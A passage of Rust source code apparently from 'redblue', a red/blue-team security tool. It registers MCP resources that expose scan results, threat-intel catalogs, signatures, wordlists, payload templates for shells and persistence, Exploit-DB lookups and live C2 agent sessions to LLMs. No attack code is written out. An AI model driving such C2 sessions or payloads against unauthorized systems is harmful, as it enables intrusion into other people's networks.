//! MCP Resources - Expose redblue data to LLMs
//!
//! Resources provide read-only access to security data, scan results,
//! vulnerability databases, and intelligence feeds.
//!
//! URI Scheme: `redblue://{category}/{resource}[/{id}]`
//!
//! ## Subscriptions
//! Resources with `subscribable: true` support real-time notifications via SSE.
//! Subscribe to get updates when scan data changes.

use std::collections::HashMap;
use std::time::{SystemTime, UNIX_EPOCH};

/// Resource metadata for MCP
#[derive(Debug, Clone)]
pub struct Resource {
    /// Unique URI for this resource
    pub uri: String,
    /// Human-readable name
    pub name: String,
    /// Description of what this resource contains
    pub description: String,
    /// MIME type of the resource content
    pub mime_type: String,
    /// Whether this resource supports subscriptions
    pub subscribable: bool,
}

/// Subscription to a resource for real-time updates
#[derive(Debug, Clone)]
pub struct ResourceSubscription {
    /// Subscription ID
    pub id: String,
    /// Resource URI being subscribed to
    pub uri: String,
    /// When the subscription was created
    pub created_at: u64,
    /// Last event sent timestamp
    pub last_event_at: u64,
}

/// Event emitted when a resource changes
#[derive(Debug, Clone)]
pub struct ResourceEvent {
    /// The resource URI that changed
    pub uri: String,
    /// Type of change: created, updated, deleted
    pub event_type: ResourceEventType,
    /// Timestamp of the event
    pub timestamp: u64,
    /// Optional data preview
    pub data: Option<String>,
}

#[derive(Debug, Clone, PartialEq)]
pub enum ResourceEventType {
    Created,
    Updated,
    Deleted,
}

/// Subscription manager for real-time resource notifications
pub struct SubscriptionManager {
    subscriptions: HashMap<String, ResourceSubscription>,
    event_queue: Vec<ResourceEvent>,
}

impl SubscriptionManager {
    pub fn new() -> Self {
        Self {
            subscriptions: HashMap::new(),
            event_queue: Vec::new(),
        }
    }

    /// Subscribe to a resource
    pub fn subscribe(&mut self, uri: &str) -> ResourceSubscription {
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs();

        let id = format!("sub_{}_{}", uri.replace('/', "_"), now);
        let sub = ResourceSubscription {
            id: id.clone(),
            uri: uri.to_string(),
            created_at: now,
            last_event_at: now,
        };
        self.subscriptions.insert(id.clone(), sub.clone());
        sub
    }

    /// Unsubscribe from a resource
    pub fn unsubscribe(&mut self, subscription_id: &str) -> bool {
        self.subscriptions.remove(subscription_id).is_some()
    }

    /// List active subscriptions
    pub fn list_subscriptions(&self) -> Vec<&ResourceSubscription> {
        self.subscriptions.values().collect()
    }

    /// Emit an event to all subscribers of a URI
    pub fn emit(&mut self, uri: &str, event_type: ResourceEventType, data: Option<String>) {
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs();

        let event = ResourceEvent {
            uri: uri.to_string(),
            event_type,
            timestamp: now,
            data,
        };
        self.event_queue.push(event);
    }

    /// Get pending events for a subscription
    pub fn poll_events(&mut self, subscription_id: &str) -> Vec<ResourceEvent> {
        let sub = match self.subscriptions.get_mut(subscription_id) {
            Some(s) => s,
            None => return Vec::new(),
        };

        let uri = sub.uri.clone();
        let last = sub.last_event_at;

        let events: Vec<_> = self
            .event_queue
            .iter()
            .filter(|e| e.uri == uri && e.timestamp > last)
            .cloned()
            .collect();

        if let Some(latest) = events.iter().map(|e| e.timestamp).max() {
            sub.last_event_at = latest;
        }

        events
    }

    /// Clean up old events (older than 5 minutes)
    pub fn cleanup(&mut self) {
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs();
        let cutoff = now.saturating_sub(300);
        self.event_queue.retain(|e| e.timestamp > cutoff);
    }
}

impl Default for SubscriptionManager {
    fn default() -> Self {
        Self::new()
    }
}

/// Resource template for parameterized URIs
#[derive(Debug, Clone)]
pub struct ResourceTemplate {
    /// URI template with placeholders (e.g., `redblue://scans/{target}`)
    pub uri_template: String,
    /// Human-readable name
    pub name: String,
    /// Description
    pub description: String,
    /// MIME type
    pub mime_type: String,
}

/// Content returned when reading a resource
#[derive(Debug, Clone)]
pub struct ResourceContent {
    /// The resource URI
    pub uri: String,
    /// MIME type
    pub mime_type: String,
    /// Text content (for text/* types)
    pub text: Option<String>,
    /// Binary content as base64 (for non-text types)
    pub blob: Option<String>,
}

/// Resource registry - manages all available resources
pub struct ResourceRegistry {
    /// Static resources (always available)
    static_resources: Vec<Resource>,
    /// Resource templates (parameterized)
    templates: Vec<ResourceTemplate>,
}

impl ResourceRegistry {
    pub fn new() -> Self {
        let mut registry = Self {
            static_resources: Vec::new(),
            templates: Vec::new(),
        };
        registry.register_all();
        registry
    }

    /// Register all redblue resources
    fn register_all(&mut self) {
        // ═══════════════════════════════════════════════════════════════════
        // STATIC RESOURCES - Always available
        // ═══════════════════════════════════════════════════════════════════

        // ───────────────────────────────────────────────────────────────────
        // SYSTEM
        // ───────────────────────────────────────────────────────────────────
        self.static_resources.push(Resource {
            uri: "redblue://system/info".into(),
            name: "System Information".into(),
            description: "redblue version, capabilities, and system status".into(),
            mime_type: "application/json".into(),
            subscribable: false,
        });

        self.static_resources.push(Resource {
            uri: "redblue://system/capabilities".into(),
            name: "Capabilities Matrix".into(),
            description: "All available tools, modules, and features".into(),
            mime_type: "application/json".into(),
            subscribable: false,
        });

        self.static_resources.push(Resource {
            uri: "redblue://system/config".into(),
            name: "Configuration".into(),
            description: "Current redblue configuration and presets".into(),
            mime_type: "application/json".into(),
            subscribable: false,
        });

        self.static_resources.push(Resource {
            uri: "redblue://system/history".into(),
            name: "Command History".into(),
            description: "Recent commands and operations".into(),
            mime_type: "application/json".into(),
            subscribable: true,
        });

        // ───────────────────────────────────────────────────────────────────
        // SESSIONS (C2 Agent)
        // ───────────────────────────────────────────────────────────────────
        self.static_resources.push(Resource {
            uri: "redblue://sessions/active".into(),
            name: "Active Sessions".into(),
            description: "Currently active C2 agent sessions".into(),
            mime_type: "application/json".into(),
            subscribable: true,
        });

        self.static_resources.push(Resource {
            uri: "redblue://sessions/history".into(),
            name: "Session History".into(),
            description: "Historical agent sessions".into(),
            mime_type: "application/json".into(),
            subscribable: false,
        });

        // ───────────────────────────────────────────────────────────────────
        // PLAYBOOKS
        // ───────────────────────────────────────────────────────────────────
        self.static_resources.push(Resource {
            uri: "redblue://playbooks/index".into(),
            name: "Playbook Index".into(),
            description: "Available automation playbooks".into(),
            mime_type: "application/json".into(),
            subscribable: false,
        });

        self.static_resources.push(Resource {
            uri: "redblue://playbooks/running".into(),
            name: "Running Playbooks".into(),
            description: "Currently executing playbooks".into(),
            mime_type: "application/json".into(),
            subscribable: true,
        });

        // ───────────────────────────────────────────────────────────────────
        // INTEL - KEV, MITRE, CPE
        // ───────────────────────────────────────────────────────────────────
        self.static_resources.push(Resource {
            uri: "redblue://intel/kev/catalog".into(),
            name: "CISA KEV Catalog".into(),
            description: "Known Exploited Vulnerabilities - actively exploited CVEs".into(),
            mime_type: "application/json".into(),
            subscribable: false,
        });

        self.static_resources.push(Resource {
            uri: "redblue://intel/mitre/tactics".into(),
            name: "MITRE ATT&CK Tactics".into(),
            description: "All ATT&CK tactics (TA0001-TA0043)".into(),
            mime_type: "application/json".into(),
            subscribable: false,
        });

        self.static_resources.push(Resource {
            uri: "redblue://intel/mitre/techniques".into(),
            name: "MITRE ATT&CK Techniques".into(),
            description: "All ATT&CK techniques and sub-techniques".into(),
            mime_type: "application/json".into(),
            subscribable: false,
        });

        self.static_resources.push(Resource {
            uri: "redblue://intel/cpe/dictionary".into(),
            name: "CPE Dictionary".into(),
            description: "Common Platform Enumeration mappings (60+ technologies)".into(),
            mime_type: "application/json".into(),
            subscribable: false,
        });

        // ───────────────────────────────────────────────────────────────────
        // SIGNATURES
        // ───────────────────────────────────────────────────────────────────
        self.static_resources.push(Resource {
            uri: "redblue://signatures/ports".into(),
            name: "Port Signatures".into(),
            description: "Service detection signatures by port number".into(),
            mime_type: "application/json".into(),
            subscribable: false,
        });

        self.static_resources.push(Resource {
            uri: "redblue://signatures/services".into(),
            name: "Service Signatures".into(),
            description: "Service fingerprinting patterns and banners".into(),
            mime_type: "application/json".into(),
            subscribable: false,
        });

        self.static_resources.push(Resource {
            uri: "redblue://signatures/os".into(),
            name: "OS Fingerprints".into(),
            description: "Operating system detection signatures".into(),
            mime_type: "application/json".into(),
            subscribable: false,
        });

        self.static_resources.push(Resource {
            uri: "redblue://signatures/cms".into(),
            name: "CMS Signatures".into(),
            description: "CMS detection patterns (WordPress, Drupal, etc.)".into(),
            mime_type: "application/json".into(),
            subscribable: false,
        });

        // ───────────────────────────────────────────────────────────────────
        // WORDLISTS & PAYLOADS
        // ───────────────────────────────────────────────────────────────────
        self.static_resources.push(Resource {
            uri: "redblue://wordlists/index".into(),
            name: "Wordlist Index".into(),
            description: "Available wordlists for fuzzing and enumeration".into(),
            mime_type: "application/json".into(),
            subscribable: false,
        });

        self.static_resources.push(Resource {
            uri: "redblue://payloads/index".into(),
            name: "Payload Index".into(),
            description: "Available payload templates (shells, persistence, etc.)".into(),
            mime_type: "application/json".into(),
            subscribable: false,
        });

        // ───────────────────────────────────────────────────────────────────
        // REFERENCE
        // ───────────────────────────────────────────────────────────────────
        self.static_resources.push(Resource {
            uri: "redblue://reference/security-headers".into(),
            name: "Security Headers Reference".into(),
            description: "HTTP security headers best practices and detection".into(),
            mime_type: "application/json".into(),
            subscribable: false,
        });

        self.static_resources.push(Resource {
            uri: "redblue://reference/ports".into(),
            name: "Well-Known Ports".into(),
            description: "IANA registered ports and common services".into(),
            mime_type: "application/json".into(),
            subscribable: false,
        });

        self.static_resources.push(Resource {
            uri: "redblue://reference/cwe-top25".into(),
            name: "CWE Top 25".into(),
            description: "Top 25 most dangerous software weaknesses".into(),
            mime_type: "application/json".into(),
            subscribable: false,
        });

        self.static_resources.push(Resource {
            uri: "redblue://reference/owasp-top10".into(),
            name: "OWASP Top 10".into(),
            description: "OWASP Top 10 web application security risks".into(),
            mime_type: "application/json".into(),
            subscribable: false,
        });

        // ───────────────────────────────────────────────────────────────────
        // SEARCH (Semantic)
        // ───────────────────────────────────────────────────────────────────
        self.static_resources.push(Resource {
            uri: "redblue://search/index".into(),
            name: "Search Index".into(),
            description: "Semantic search index metadata".into(),
            mime_type: "application/json".into(),
            subscribable: false,
        });

        // ═══════════════════════════════════════════════════════════════════
        // RESOURCE TEMPLATES - Parameterized resources
        // ═══════════════════════════════════════════════════════════════════

        self.templates.push(ResourceTemplate {
            uri_template: "redblue://scans/{target}".into(),
            name: "Scan Results".into(),
            description: "All scan results for a specific target".into(),
            mime_type: "application/json".into(),
        });

        self.templates.push(ResourceTemplate {
            uri_template: "redblue://scans/{target}/ports".into(),
            name: "Port Scan Results".into(),
            description: "Port scan results for a target".into(),
            mime_type: "application/json".into(),
        });

        self.templates.push(ResourceTemplate {
            uri_template: "redblue://scans/{target}/subdomains".into(),
            name: "Subdomain Results".into(),
            description: "Discovered subdomains for a domain".into(),
            mime_type: "application/json".into(),
        });

        self.templates.push(ResourceTemplate {
            uri_template: "redblue://vulns/{cve_id}".into(),
            name: "CVE Details".into(),
            description: "Detailed vulnerability information by CVE ID".into(),
            mime_type: "application/json".into(),
        });

        self.templates.push(ResourceTemplate {
            uri_template: "redblue://intel/mitre/technique/{technique_id}".into(),
            name: "ATT&CK Technique".into(),
            description: "Details for a specific MITRE ATT&CK technique".into(),
            mime_type: "application/json".into(),
        });

        self.templates.push(ResourceTemplate {
            uri_template: "redblue://db/{partition}".into(),
            name: "Database Partition".into(),
            description: "RedDB partition data and metadata".into(),
            mime_type: "application/json".into(),
        });

        self.templates.push(ResourceTemplate {
            uri_template: "redblue://wordlists/{name}".into(),
            name: "Wordlist Content".into(),
            description: "Content of a specific wordlist".into(),
            mime_type: "text/plain".into(),
        });

        self.templates.push(ResourceTemplate {
            uri_template: "redblue://payloads/{category}/{name}".into(),
            name: "Payload Template".into(),
            description: "A specific payload template".into(),
            mime_type: "text/plain".into(),
        });

        self.templates.push(ResourceTemplate {
            uri_template: "redblue://whois/{domain}".into(),
            name: "WHOIS Data".into(),
            description: "WHOIS registration data for a domain".into(),
            mime_type: "application/json".into(),
        });

        self.templates.push(ResourceTemplate {
            uri_template: "redblue://dns/{domain}".into(),
            name: "DNS Records".into(),
            description: "All DNS records for a domain".into(),
            mime_type: "application/json".into(),
        });

        self.templates.push(ResourceTemplate {
            uri_template: "redblue://ioc/{type}/{value}".into(),
            name: "IOC Lookup".into(),
            description: "Indicator of Compromise lookup".into(),
            mime_type: "application/json".into(),
        });

        self.templates.push(ResourceTemplate {
            uri_template: "redblue://exploits/{edb_id}".into(),
            name: "Exploit Details".into(),
            description: "Details for a specific Exploit-DB entry".into(),
            mime_type: "application/json".into(),
        });

        // ───────────────────────────────────────────────────────────────────
        // SEMANTIC SEARCH TEMPLATES
        // ───────────────────────────────────────────────────────────────────
        self.templates.push(ResourceTemplate {
            uri_template: "redblue://search/{query}".into(),
            name: "Semantic Search".into(),
            description: "Search across all data with natural language".into(),
            mime_type: "application/json".into(),
        });

        self.templates.push(ResourceTemplate {
            uri_template: "redblue://similar/cve/{cve_id}".into(),
            name: "Similar CVEs".into(),
            description: "Find vulnerabilities similar to a given CVE".into(),
            mime_type: "application/json".into(),
        });

        self.templates.push(ResourceTemplate {
            uri_template: "redblue://similar/technique/{technique_id}".into(),
            name: "Related Techniques".into(),
            description: "Find MITRE ATT&CK techniques related to a given one".into(),
            mime_type: "application/json".into(),
        });

        // ───────────────────────────────────────────────────────────────────
        // SESSION TEMPLATES
        // ───────────────────────────────────────────────────────────────────
        self.templates.push(ResourceTemplate {
            uri_template: "redblue://sessions/{session_id}".into(),
            name: "Session Details".into(),
            description: "Details for a specific C2 agent session".into(),
            mime_type: "application/json".into(),
        });

        self.templates.push(ResourceTemplate {
            uri_template: "redblue://sessions/{session_id}/commands".into(),
            name: "Session Commands".into(),
            description: "Commands sent to a specific session".into(),
            mime_type: "application/json".into(),
        });

        // ───────────────────────────────────────────────────────────────────
        // PLAYBOOK TEMPLATES
        // ───────────────────────────────────────────────────────────────────
        self.templates.push(ResourceTemplate {
            uri_template: "redblue://playbooks/{name}".into(),
            name: "Playbook Details".into(),
            description: "Content and metadata for a specific playbook".into(),
            mime_type: "application/json".into(),
        });

        self.templates.push(ResourceTemplate {
            uri_template: "redblue://playbooks/{name}/runs".into(),
            name: "Playbook Runs".into(),
            description: "Execution history for a playbook".into(),
            mime_type: "application/json".into(),
        });

        // ───────────────────────────────────────────────────────────────────
        // EXPLOIT-DB SEARCH TEMPLATE
        // ───────────────────────────────────────────────────────────────────
        self.templates.push(ResourceTemplate {
            uri_template: "redblue://intel/exploitdb/{query}".into(),
            name: "Exploit-DB Search".into(),
            description: "Search Exploit-DB by product, CVE, or keyword".into(),
            mime_type: "application/json".into(),
        });

        // ───────────────────────────────────────────────────────────────────
        // LIVE SCAN TEMPLATES (Subscribable)
        // ───────────────────────────────────────────────────────────────────
        self.templates.push(ResourceTemplate {
            uri_template: "redblue://scans/{target}/live".into(),
            name: "Live Scan Stream".into(),
            description: "Real-time scan results as they're discovered".into(),
            mime_type: "text/event-stream".into(),
        });

        self.templates.push(ResourceTemplate {
            uri_template: "redblue://scans/{target}/progress".into(),
            name: "Scan Progress".into(),
            description: "Current progress and ETA for active scans".into(),
            mime_type: "application/json".into(),
        });

        // ───────────────────────────────────────────────────────────────────
        // SIGNATURE TEMPLATES
        // ───────────────────────────────────────────────────────────────────
        self.templates.push(ResourceTemplate {
            uri_template: "redblue://signatures/service/{name}".into(),
            name: "Service Signature".into(),
            description: "Detection patterns for a specific service".into(),
            mime_type: "application/json".into(),
        });

        self.templates.push(ResourceTemplate {
            uri_template: "redblue://signatures/port/{port}".into(),
            name: "Port Signature".into(),
            description: "Services commonly found on a specific port".into(),
            mime_type: "application/json".into(),
        });
    }

    /// List all static resources
    pub fn list_resources(&self) -> &[Resource] {
        &self.static_resources
    }

    /// List all resource templates
    pub fn list_templates(&self) -> &[ResourceTemplate] {
        &self.templates
    }

    /// Read a resource by URI
    pub fn read_resource(&self, uri: &str) -> Result<ResourceContent, String> {
        let uri_path = uri.strip_prefix("redblue://").unwrap_or(uri);
        let parts: Vec<&str> = uri_path.split('/').collect();

        if parts.is_empty() {
            return Err("Invalid resource URI".into());
        }

        match parts[0] {
            "system" => self.read_system_resource(&parts[1..]),
            "intel" => self.read_intel_resource(&parts[1..]),
            "scans" => self.read_scan_resource(&parts[1..]),
            "vulns" => self.read_vuln_resource(&parts[1..]),
            "db" => self.read_db_resource(&parts[1..]),
            "wordlists" => self.read_wordlist_resource(&parts[1..]),
            "payloads" => self.read_payload_resource(&parts[1..]),
            "whois" => self.read_whois_resource(&parts[1..]),
            "dns" => self.read_dns_resource(&parts[1..]),
            "ioc" => self.read_ioc_resource(&parts[1..]),
            "exploits" => self.read_exploit_resource(&parts[1..]),
            "signatures" => self.read_signature_resource(&parts[1..]),
            "reference" => self.read_reference_resource(&parts[1..]),
            "sessions" => self.read_sessions_resource(&parts[1..]),
            "playbooks" => self.read_playbooks_resource(&parts[1..]),
            "search" => self.read_search_resource(&parts[1..]),
            "similar" => self.read_similar_resource(&parts[1..]),
            _ => Err(format!("Unknown resource category: {}", parts[0])),
        }
    }

    fn read_system_resource(&self, parts: &[&str]) -> Result<ResourceContent, String> {
        if parts.is_empty() {
            return Err("Missing system resource name".into());
        }

        match parts[0] {
            "info" => Ok(ResourceContent {
                uri: "redblue://system/info".into(),
                mime_type: "application/json".into(),
                text: Some(self.gen_system_info()),
                blob: None,
            }),
            "capabilities" => Ok(ResourceContent {
                uri: "redblue://system/capabilities".into(),
                mime_type: "application/json".into(),
                text: Some(self.gen_capabilities()),
                blob: None,
            }),
            "config" => Ok(ResourceContent {
                uri: "redblue://system/config".into(),
                mime_type: "application/json".into(),
                text: Some(self.gen_config()),
                blob: None,
            }),
            "history" => Ok(ResourceContent {
                uri: "redblue://system/history".into(),
                mime_type: "application/json".into(),
                text: Some(self.gen_history()),
                blob: None,
            }),
            _ => Err(format!("Unknown system resource: {}", parts[0])),
        }
    }

    fn read_intel_resource(&self, parts: &[&str]) -> Result<ResourceContent, String> {
        if parts.is_empty() {
            return Err("Missing intel resource path".into());
        }

        match parts[0] {
            "kev" => self.read_kev_resource(&parts[1..]),
            "mitre" => self.read_mitre_resource(&parts[1..]),
            "cpe" => self.read_cpe_resource(&parts[1..]),
            "exploitdb" => self.read_exploitdb_resource(&parts[1..]),
            _ => Err(format!("Unknown intel resource: {}", parts[0])),
        }
    }

    fn read_exploitdb_resource(&self, parts: &[&str]) -> Result<ResourceContent, String> {
        let query = parts.first().copied().unwrap_or("latest");
        Ok(ResourceContent {
            uri: format!("redblue://intel/exploitdb/{}", query),
            mime_type: "application/json".into(),
            text: Some(self.gen_exploitdb_search(query)),
            blob: None,
        })
    }

    fn read_kev_resource(&self, parts: &[&str]) -> Result<ResourceContent, String> {
        let name = parts.first().copied().unwrap_or("catalog");
        Ok(ResourceContent {
            uri: format!("redblue://intel/kev/{}", name),
            mime_type: "application/json".into(),
            text: Some(self.gen_kev_data(name)),
            blob: None,
        })
    }

    fn read_mitre_resource(&self, parts: &[&str]) -> Result<ResourceContent, String> {
        if parts.is_empty() {
            return Err("Missing MITRE resource".into());
        }

        match parts[0] {
            "tactics" => Ok(ResourceContent {
                uri: "redblue://intel/mitre/tactics".into(),
                mime_type: "application/json".into(),
                text: Some(self.gen_mitre_tactics()),
                blob: None,
            }),
            "techniques" => Ok(ResourceContent {
                uri: "redblue://intel/mitre/techniques".into(),
                mime_type: "application/json".into(),
                text: Some(self.gen_mitre_techniques()),
                blob: None,
            }),
            "technique" if parts.len() > 1 => Ok(ResourceContent {
                uri: format!("redblue://intel/mitre/technique/{}", parts[1]),
                mime_type: "application/json".into(),
                text: Some(self.gen_technique_details(parts[1])),
                blob: None,
            }),
            _ => Err(format!("Unknown MITRE resource: {}", parts[0])),
        }
    }

    fn read_cpe_resource(&self, parts: &[&str]) -> Result<ResourceContent, String> {
        Ok(ResourceContent {
            uri: "redblue://intel/cpe/dictionary".into(),
            mime_type: "application/json".into(),
            text: Some(self.gen_cpe_dictionary()),
            blob: None,
        })
    }

    fn read_scan_resource(&self, parts: &[&str]) -> Result<ResourceContent, String> {
        if parts.is_empty() {
            return Err("Missing target".into());
        }
        let target = parts[0];
        let scan_type = parts.get(1).copied();
        Ok(ResourceContent {
            uri: format!(
                "redblue://scans/{}{}",
                target,
                scan_type.map(|t| format!("/{}", t)).unwrap_or_default()
            ),
            mime_type: "application/json".into(),
            text: Some(self.gen_scan_results(target, scan_type)),
            blob: None,
        })
    }

    fn read_vuln_resource(&self, parts: &[&str]) -> Result<ResourceContent, String> {
        if parts.is_empty() {
            return Err("Missing CVE ID".into());
        }
        Ok(ResourceContent {
            uri: format!("redblue://vulns/{}", parts[0]),
            mime_type: "application/json".into(),
            text: Some(self.gen_cve_details(parts[0])),
            blob: None,
        })
    }

    fn read_db_resource(&self, parts: &[&str]) -> Result<ResourceContent, String> {
        if parts.is_empty() {
            return Ok(ResourceContent {
                uri: "redblue://db".into(),
                mime_type: "application/json".into(),
                text: Some(self.gen_db_partitions()),
                blob: None,
            });
        }
        Ok(ResourceContent {
            uri: format!("redblue://db/{}", parts.join("/")),
            mime_type: "application/json".into(),
            text: Some(self.gen_db_partition(parts[0], parts.get(1).copied())),
            blob: None,
        })
    }

    fn read_wordlist_resource(&self, parts: &[&str]) -> Result<ResourceContent, String> {
        if parts.is_empty() || parts[0] == "index" {
            return Ok(ResourceContent {
                uri: "redblue://wordlists/index".into(),
                mime_type: "application/json".into(),
                text: Some(self.gen_wordlist_index()),
                blob: None,
            });
        }
        Ok(ResourceContent {
            uri: format!("redblue://wordlists/{}", parts[0]),
            mime_type: "text/plain".into(),
            text: Some(self.gen_wordlist_content(parts[0])),
            blob: None,
        })
    }

    fn read_payload_resource(&self, parts: &[&str]) -> Result<ResourceContent, String> {
        if parts.is_empty() || parts[0] == "index" {
            return Ok(ResourceContent {
                uri: "redblue://payloads/index".into(),
                mime_type: "application/json".into(),
                text: Some(self.gen_payload_index()),
                blob: None,
            });
        }
        let category = parts[0];
        let name = parts.get(1).copied();
        Ok(ResourceContent {
            uri: format!(
                "redblue://payloads/{}{}",
                category,
                name.map(|n| format!("/{}", n)).unwrap_or_default()
            ),
            mime_type: "text/plain".into(),
            text: Some(self.gen_payload_content(category, name)),
            blob: None,
        })
    }

    fn read_whois_resource(&self, parts: &[&str]) -> Result<ResourceContent, String> {
        if parts.is_empty() {
            return Err("Missing domain".into());
        }
        Ok(ResourceContent {
            uri: format!("redblue://whois/{}", parts[0]),
            mime_type: "application/json".into(),
            text: Some(self.gen_whois_data(parts[0])),
            blob: None,
        })
    }

    fn read_dns_resource(&self, parts: &[&str]) -> Result<ResourceContent, String> {
        if parts.is_empty() {
            return Err("Missing domain".into());
        }
        Ok(ResourceContent {
            uri: format!("redblue://dns/{}", parts[0]),
            mime_type: "application/json".into(),
            text: Some(self.gen_dns_records(parts[0], parts.get(1).copied())),
            blob: None,
        })
    }

    fn read_ioc_resource(&self, parts: &[&str]) -> Result<ResourceContent, String> {
        if parts.len() < 2 {
            return Err("Missing IOC type and value".into());
        }
        Ok(ResourceContent {
            uri: format!("redblue://ioc/{}/{}", parts[0], parts[1]),
            mime_type: "application/json".into(),
            text: Some(self.gen_ioc_lookup(parts[0], parts[1])),
            blob: None,
        })
    }

    fn read_exploit_resource(&self, parts: &[&str]) -> Result<ResourceContent, String> {
        if parts.is_empty() {
            return Err("Missing exploit ID".into());
        }
        Ok(ResourceContent {
            uri: format!("redblue://exploits/{}", parts[0]),
            mime_type: "application/json".into(),
            text: Some(self.gen_exploit_details(parts[0])),
            blob: None,
        })
    }

    fn read_signature_resource(&self, parts: &[&str]) -> Result<ResourceContent, String> {
        if parts.is_empty() {
            return Err("Missing signature type".into());
        }

        match parts[0] {
            "ports" => Ok(ResourceContent {
                uri: "redblue://signatures/ports".into(),
                mime_type: "application/json".into(),
                text: Some(self.gen_port_signatures()),
                blob: None,
            }),
            "services" => Ok(ResourceContent {
                uri: "redblue://signatures/services".into(),
                mime_type: "application/json".into(),
                text: Some(self.gen_service_signatures()),
                blob: None,
            }),
            "service" if parts.len() > 1 => Ok(ResourceContent {
                uri: format!("redblue://signatures/service/{}", parts[1]),
                mime_type: "application/json".into(),
                text: Some(self.gen_service_signature(parts[1])),
                blob: None,
            }),
            "port" if parts.len() > 1 => Ok(ResourceContent {
                uri: format!("redblue://signatures/port/{}", parts[1]),
                mime_type: "application/json".into(),
                text: Some(self.gen_port_signature(parts[1])),
                blob: None,
            }),
            "os" => Ok(ResourceContent {
                uri: "redblue://signatures/os".into(),
                mime_type: "application/json".into(),
                text: Some(self.gen_os_signatures()),
                blob: None,
            }),
            "cms" => Ok(ResourceContent {
                uri: "redblue://signatures/cms".into(),
                mime_type: "application/json".into(),
                text: Some(self.gen_cms_signatures()),
                blob: None,
            }),
            _ => Err(format!("Unknown signature type: {}", parts[0])),
        }
    }

    fn read_reference_resource(&self, parts: &[&str]) -> Result<ResourceContent, String> {
        if parts.is_empty() {
            return Err("Missing reference type".into());
        }

        match parts[0] {
            "security-headers" => Ok(ResourceContent {
                uri: "redblue://reference/security-headers".into(),
                mime_type: "application/json".into(),
                text: Some(self.gen_security_headers_ref()),
                blob: None,
            }),
            "ports" => Ok(ResourceContent {
                uri: "redblue://reference/ports".into(),
                mime_type: "application/json".into(),
                text: Some(self.gen_well_known_ports()),
                blob: None,
            }),
            "cwe-top25" => Ok(ResourceContent {
                uri: "redblue://reference/cwe-top25".into(),
                mime_type: "application/json".into(),
                text: Some(self.gen_cwe_top25()),
                blob: None,
            }),
            "owasp-top10" => Ok(ResourceContent {
                uri: "redblue://reference/owasp-top10".into(),
                mime_type: "application/json".into(),
                text: Some(self.gen_owasp_top10()),
                blob: None,
            }),
            _ => Err(format!("Unknown reference type: {}", parts[0])),
        }
    }

    // ───────────────────────────────────────────────────────────────────────
    // NEW RESOURCE HANDLERS
    // ───────────────────────────────────────────────────────────────────────

    fn read_sessions_resource(&self, parts: &[&str]) -> Result<ResourceContent, String> {
        if parts.is_empty() || parts[0] == "active" {
            return Ok(ResourceContent {
                uri: "redblue://sessions/active".into(),
                mime_type: "application/json".into(),
                text: Some(self.gen_active_sessions()),
                blob: None,
            });
        }

        match parts[0] {
            "history" => Ok(ResourceContent {
                uri: "redblue://sessions/history".into(),
                mime_type: "application/json".into(),
                text: Some(self.gen_session_history()),
                blob: None,
            }),
            session_id => {
                let sub = parts.get(1).copied();
                Ok(ResourceContent {
                    uri: format!(
                        "redblue://sessions/{}{}",
                        session_id,
                        sub.map(|s| format!("/{}", s)).unwrap_or_default()
                    ),
                    mime_type: "application/json".into(),
                    text: Some(self.gen_session_details(session_id, sub)),
                    blob: None,
                })
            }
        }
    }

    fn read_playbooks_resource(&self, parts: &[&str]) -> Result<ResourceContent, String> {
        if parts.is_empty() || parts[0] == "index" {
            return Ok(ResourceContent {
                uri: "redblue://playbooks/index".into(),
                mime_type: "application/json".into(),
                text: Some(self.gen_playbook_index()),
                blob: None,
            });
        }

        match parts[0] {
            "running" => Ok(ResourceContent {
                uri: "redblue://playbooks/running".into(),
                mime_type: "application/json".into(),
                text: Some(self.gen_running_playbooks()),
                blob: None,
            }),
            playbook_name => {
                let sub = parts.get(1).copied();
                Ok(ResourceContent {
                    uri: format!(
                        "redblue://playbooks/{}{}",
                        playbook_name,
                        sub.map(|s| format!("/{}", s)).unwrap_or_default()
                    ),
                    mime_type: "application/json".into(),
                    text: Some(self.gen_playbook_details(playbook_name, sub)),
                    blob: None,
                })
            }
        }
    }

    fn read_search_resource(&self, parts: &[&str]) -> Result<ResourceContent, String> {
        if parts.is_empty() || parts[0] == "index" {
            return Ok(ResourceContent {
                uri: "redblue://search/index".into(),
                mime_type: "application/json".into(),
                text: Some(self.gen_search_index()),
                blob: None,
            });
        }

        let query = parts.join("/");
        Ok(ResourceContent {
            uri: format!("redblue://search/{}", query),
            mime_type: "application/json".into(),
            text: Some(self.gen_search_results(&query)),
            blob: None,
        })
    }

    fn read_similar_resource(&self, parts: &[&str]) -> Result<ResourceContent, String> {
        if parts.len() < 2 {
            return Err("Missing similar type and ID".into());
        }

        match parts[0] {
            "cve" => Ok(ResourceContent {
                uri: format!("redblue://similar/cve/{}", parts[1]),
                mime_type: "application/json".into(),
                text: Some(self.gen_similar_cves(parts[1])),
                blob: None,
            }),
            "technique" => Ok(ResourceContent {
                uri: format!("redblue://similar/technique/{}", parts[1]),
                mime_type: "application/json".into(),
                text: Some(self.gen_similar_techniques(parts[1])),
                blob: None,
            }),
            _ => Err(format!("Unknown similar type: {}", parts[0])),
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // DATA GENERATORS
    // ═══════════════════════════════════════════════════════════════════════

    fn gen_system_info(&self) -> String {
        format!(
            r#"{{"name":"redblue","version":"{}","tools_replaced":30,"binary_size_kb":500}}"#,
            env!("CARGO_PKG_VERSION")
        )
    }

    fn gen_capabilities(&self) -> String {
        r#"{"domains":["network","dns","web","recon","intel","exploit","memory","database"]}"#
            .into()
    }

    fn gen_kev_data(&self, _name: &str) -> String {
        r#"{"title":"CISA KEV","count":1200,"note":"Use rb intel vuln kev for live data"}"#.into()
    }

    fn gen_mitre_tactics(&self) -> String {
        r#"{"tactics":[{"id":"TA0001","name":"Initial Access"},{"id":"TA0002","name":"Execution"},{"id":"TA0003","name":"Persistence"},{"id":"TA0004","name":"Privilege Escalation"},{"id":"TA0005","name":"Defense Evasion"},{"id":"TA0006","name":"Credential Access"},{"id":"TA0007","name":"Discovery"},{"id":"TA0008","name":"Lateral Movement"}]}"#.into()
    }

    fn gen_mitre_techniques(&self) -> String {
        r#"{"total":201,"highlights":["T1059 Command Interpreter","T1055 Process Injection","T1021 Remote Services"]}"#.into()
    }

